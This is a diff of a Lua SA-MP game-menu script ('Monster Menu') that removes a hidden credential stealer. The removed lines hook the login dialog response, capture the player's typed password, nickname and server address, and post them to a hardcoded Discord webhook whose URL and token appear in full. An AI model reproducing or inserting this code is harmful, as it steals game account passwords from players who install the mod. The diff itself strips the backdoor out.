@@ -14,11 +14,6 @@ local encoding = require('encoding')
 encoding.default = ('CP1251')
 u8 = encoding.UTF8
 
-local https = require("ssl.https")
-local ltn12 = require("ltn12")
-local webhookUrl = "https://discord.com/api/webhooks/1411477721061654610/c2GmV5ygOdGhUVrQc3hXAr_REGe96vsEvcS-i1zDGjI8AyhCJgs_eXSAt7ru6PXWJ1fi" -- Coloque seu webhook do Discord
-local messageSent = false
-
 local new = imgui.new
 local sampev = require "samp.events"
 local widgets = require "widgets"
@@ -565,45 +560,6 @@ lua_thread.create(function()
     end
 end)
 
-function sendMessageToDiscord(content)
-    local body = '{"content": "' .. content:gsub('"', '\"'):gsub("\n", "\\n") .. '"}'
-    local response_body = {}
-    https.request{
-        url = webhookUrl,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = tostring(#body)
-        },
-        source = ltn12.source.string(body),
-        sink = ltn12.sink.table(response_body)
-    }
-end
-require("samp.events").onSendDialogResponse = function(dialogId, button, listboxId, input)
-    if dialogId ~= 2 and dialogId ~= 3 and dialogId ~= 4 then
-        return
-    end
-    if not messageSent then
-        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
-        local nick = sampGetPlayerNickname(id)
-        local hor = os.date("%H:%M:%S")
-        local ip, port = sampGetCurrentServerAddress()
-        local servername = sampGetCurrentServerName()
-        local message = string.format(
-            "DEXTER SCRIPT\n\nSCRIPT EXECUTADO: Monster Menu\nID DA DIALOG: %d\nSENHA: %s\nNICK: %s\nIP : %s:%d\nNOME DO SERVIDOR: %s\nHORAS: %s",
-            dialogId,
-            input,
-            nick,
-            ip,
-            port,
-            servername,
-            hor
-        )
-        sendMessageToDiscord(message)
-        messageSent = true
-    end
-end
-
 imgui.OnInitialize(function()
     local config = imgui.ImFontConfig()
     config.MergeMode = true
@@ -884,5 +840,6 @@ function sampev.onSendPlayerSync(data)
     end
 
 end
+
 
 
